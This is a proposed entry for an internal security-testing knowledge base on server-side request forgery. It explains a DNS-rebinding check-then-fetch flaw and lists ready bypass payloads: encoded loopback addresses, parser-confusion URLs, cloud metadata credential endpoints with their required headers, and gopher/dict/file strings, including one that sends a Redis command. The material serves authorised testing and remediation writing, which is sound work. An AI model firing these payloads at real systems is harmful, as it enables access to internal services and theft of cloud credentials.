# PROPOSAL (proposal) for docs/knowledge/class-ssrf.md — kb-enrich 2026-08-15
_Review and apply manually; not auto-merged into the KB._

## 2026-08-15 addition — DNS-rebinding TOCTOU (the live 2026 CVE pattern) + full bypass payload reference

### DNS-rebinding TOCTOU — check this FIRST on any target with an apparent SSRF allowlist/validator
Two 2026 CVEs (Craft CMS CVE-2026-27127, MCP Atlassian CVE-2026-27826) share one root cause: the SSRF
guard does a DNS lookup to VALIDATE the host, then the HTTP client does a SEPARATE DNS lookup to CONNECT —
if the attacker controls the DNS answer (very low/zero TTL, alternating records), the validator's lookup
returns a public/allowed IP while the connect's lookup returns `169.254.169.254`/`127.0.0.1`/internal RFC1918.
Ready-made rebinding services for interactsh-style testing: `1u.ms` (flips IP per lookup), `rbndr.us`
(pre-built rebinding pairs), `nip.io`/`sslip.io` (embed target IP in hostname, e.g.
`169-254-169-254.sslip.io`). Relevant to our lane wherever a target validates a user-supplied URL/host
BEFORE fetching it (webhook URL, image-proxy URL, PDF-render URL, "test my URL" callback config) — this is
exactly our existing OOB-interactsh confirm primitive's territory, just needs a rebinding DNS instead of a
static canary host to catch validate-then-refetch designs.

### Concrete bypass payload reference (for building probe variants; all SAFE/read-only when combined with our
existing OOB-canary confirm primitive — never point these at file:// or an internal data endpoint)
**IP encoding tricks (defeat text/regex blocklists):**
- Decimal: `http://2130706433/` = 127.0.0.1
- Hex dotless: `http://0x7f000001/` = 127.0.0.1 · Hex-per-octet: `http://0x7f.0x0.0x0.0x1/`
- Octal: `http://0177.0.0.1/` = 127.0.0.1 (leading zero)
- Short form: `http://127.1/`, `http://127.0.1/` both = 127.0.0.1
- IPv6-mapped IPv4: `http://[::ffff:169.254.169.254]/`, `http://[::ffff:7f00:1]/`
- Wildcard-DNS services: `http://169.254.169.254.nip.io/`, `http://169-254-169-254.sslip.io/`

**URL-parser confusion (validator and fetcher disagree on what the "host" is):**
- Userinfo: `http://allowed.com@169.254.169.254/` (server parses text before `@` as basic-auth creds, the
  actual connection target is what's after `@`)
- Fragment confusion: `http://169.254.169.254#@allowed.com/`
- Suffix-allowlist bypass: `http://allowed.com.evil.com/` (defeats naive `.endswith("allowed.com")` checks)
- RFC3986-vs-WHATWG divergence (different libs parse `\` and unicode slash-lookalikes differently):
  `http://127.0.0.1\@allowed.com/`, `http://allowed.com⁄@127.0.0.1/` (U+2044 fraction slash)

**Redirect-based:** host an innocuous URL that passes the allowlist, 302-redirect it server-side to
`http://169.254.169.254/latest/meta-data/...` — only works if the fetcher follows redirects (ours
(`recon_safe_probe.sh`) deliberately does NOT follow redirects — good, keep it that way; but note this as
a manual-test technique for targets we're testing via authed/active PoC where redirect-following may differ).

**Cloud metadata endpoints (fingerprint which cloud + which IMDS version before choosing payload):**
- AWS IMDSv1 (no auth, GET works): `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- AWS IMDSv2 (requires `PUT /latest/api/token` + `X-aws-ec2-metadata-token-ttl-seconds` header — GET-only
  SSRF primitives can't reach this without a way to control the PUT verb/headers)
- GCP: `http://169.254.169.254/computeMetadata/v1/?recursive=true` + header `Metadata-Flavor: Google`
- Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` + header `Metadata: true`
- Alibaba Cloud: `http://100.100.100.200/latest/meta-data/ram/security-credentials/`

**Exotic-scheme raw-socket primitives (NOT for our unauth-safe automated probe — GET/HEAD/OPTIONS-only
doctrine excludes these; record only as manual/authed-PoC reference):** `gopher://` (raw bytes to arbitrary
port, e.g. Redis `PING` via `gopher://127.0.0.1:6379/_%2A1%0d%0a%244%0d%0aPING%0d%0a`), `dict://` (service
fingerprint via `dict://127.0.0.1:6379/info`), `file://` (local file read).

### Core defense-side heuristic worth knowing when triaging (helps write accurate report language)
Root cause across nearly all bypass classes: "the filter and the HTTP client disagree" — the validator
parses the URL text one way, the code that actually opens the socket parses/resolves it another way.
Correct defense is resolve-once/connect-to-the-validated-IP with no fresh DNS lookup at connect time —
useful language for report remediation-recommendation sections.
